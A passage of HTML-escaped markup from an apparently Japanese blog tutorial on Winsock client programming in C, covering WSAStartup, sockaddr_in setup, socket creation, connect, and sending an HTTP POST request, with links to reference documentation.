    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Connecting succeeded!!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
 
    &lt;span class=&quot;token comment&quot;&gt;// HTTPリクエストの作成&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Creating HTTP request...\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;toSendText&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;POST %s HTTP/1.1\r\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; httppath&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; toSendText&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;toSendText&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
 
    &lt;span class=&quot;token function&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;toSendText&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Host: %s:%d\r\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; httphost&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; port&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; toSendText&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;toSendText&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;postdata&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;%s\r\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; senddata&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;toSendText&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Content-Length: %d\r\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;postdata&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; toSendText&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;toSendText&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
         
    &lt;span class=&quot;token function&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;toSendText&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;\r\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; toSendText&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;toSendText&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// HTTPリクエストの送信&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Sending HTTP request...\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; postdata&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;postdata&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  
    &lt;span class=&quot;token comment&quot;&gt;// 通信のクローズ&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;HTTP request is sent!!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;closesocket&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;WSACleanup&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;wsadataの初期化&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#wsadata%E3%81%AE%E5%88%9D%E6%9C%9F%E5%8C%96&quot; aria-label=&quot;wsadataの初期化 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WSADATAの初期化&lt;/h3&gt;
&lt;p&gt;まずはソケット通信に必要な&lt;code class=&quot;language-text&quot;&gt;WSADATA&lt;/code&gt;構造体を&lt;code class=&quot;language-text&quot;&gt;WSAStartup&lt;/code&gt;関数で初期化します。&lt;/p&gt;
&lt;p&gt;Windows Socketsのバージョンは2.0を指定しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// WSADATAの初期化&lt;/span&gt;
WSADATA data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;WSAStartup&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;MAKEWORD&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;通信先の指定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E9%80%9A%E4%BF%A1%E5%85%88%E3%81%AE%E6%8C%87%E5%AE%9A&quot; aria-label=&quot;通信先の指定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;通信先の指定&lt;/h3&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// AF_INETを設定&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;sockaddr_in&lt;/span&gt; dstAddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
dstAddr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sin_port &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
dstAddr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sin_family &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; AF_INET&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
dstAddr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sin_addr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;s_addr &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;destination&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;WSADATA&lt;/code&gt;構造体の初期化後、&lt;code class=&quot;language-text&quot;&gt;sockaddr_in&lt;/code&gt;構造体を作成してアドレスファミリと通信先のアドレス、ポート番号を定義します。&lt;/p&gt;
&lt;p&gt;公式ドキュメントでは&lt;code class=&quot;language-text&quot;&gt;addrinfo&lt;/code&gt;構造体を使用する方法が紹介されていますが、今回は&lt;code class=&quot;language-text&quot;&gt;sockaddr_in&lt;/code&gt;構造体を使用してます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-socket-for-the-client&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Creating a Socket for the Client - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;sockaddr_in&lt;/code&gt;構造体はIPv4の通信にのみ利用でき、IPv6を使用する場合は&lt;code class=&quot;language-text&quot;&gt;sockaddr_in6&lt;/code&gt;構造体を使用します。&lt;/p&gt;
&lt;p&gt;公式ドキュメントで使用している&lt;code class=&quot;language-text&quot;&gt;addrinfo&lt;/code&gt;構造体はIPv4とIPv6の両方にソケットを使用する場合に利用します。&lt;/p&gt;
&lt;p&gt;特に理由がなければ&lt;code class=&quot;language-text&quot;&gt;addrinfo&lt;/code&gt;構造体を使っておけば問題なさそうですね。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://medium.com/adamedelwiess/operating-system-9-socket-programming-experiment-2-enable-ipv4-and-ipv6-c2f034511cd4&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Operating System 9 | Socket Programming Experiment 2: Enable IPv4 and IPv6 | by Adam Edelweiss | SereneField | Medium&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/23401147/what-is-the-difference-between-struct-addrinfo-and-struct-sockaddr&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;c - What is the difference between struct addrinfo and struct sockaddr - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;アドレスファミリには&lt;code class=&quot;language-text&quot;&gt;AF_INET&lt;/code&gt;を指定しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;AF_INET&lt;/code&gt;はIPv4の通信を行う場合に定義するアドレスファミリです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/1593946/what-is-af-inet-and-why-do-i-need-it&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;sockets - What is AF_INET, and why do I need it? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;socketの作成&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#socket%E3%81%AE%E4%BD%9C%E6%88%90&quot; aria-label=&quot;socketの作成 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Socketの作成&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;socket&lt;/code&gt;関数を使ってソケットを作成します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Socket通信の開始(SOCK_STREAMを指定)&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Creating socket...\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
dstSocket &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;AF_INET&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; SOCK_STREAM&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Creating socket failed!!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Creating socket succeeded!!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;今回はTCP接続を行うため、第2引数には&lt;code class=&quot;language-text&quot;&gt;SOCK_STREAM&lt;/code&gt;を指定しています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;socket function (winsock2.h) - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;第3引数には&lt;em&gt;プロトコル&lt;/em&gt;パラメータであり、使用するプロトコルを定義できます。&lt;/p&gt;
&lt;p&gt;今回はTCPを明示的に指定しておらず、0を渡しています。&lt;/p&gt;
&lt;p&gt;これは、プロトコルの指定を呼び出し元が行わないことを意味します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/3735773/what-does-0-indicate-in-socket-system-call&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;c - what does 0 indicate in socket() system call? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;コネクションの確立&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B3%E3%83%8D%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E7%A2%BA%E7%AB%8B&quot; aria-label=&quot;コネクションの確立 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;コネクションの確立&lt;/h3&gt;
&lt;p&gt;次は&lt;code class=&quot;language-text&quot;&gt;connect&lt;/code&gt;関数でソケット接続を確立します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// 通信の開始&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Connecting...\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
result &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;result &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Binding failed!!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Connecting succeeded!!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;connect&lt;/code&gt;関数はSocket通信におけるクライアント側の接続を行います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/winsock/connecting-to-a-socket&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Connecting to a Socket - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;この関数によってbindされているSocketサーバとのTCPコネクションを確立します。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/70d7cbb162e7199a3a6b8596fc9fc683/socket_client_server.gif&quot; alt=&quot;https://www.tutorialspoint.com/unix_sockets/images/socket_client_server.gif&quot;&gt;&lt;/p&gt;
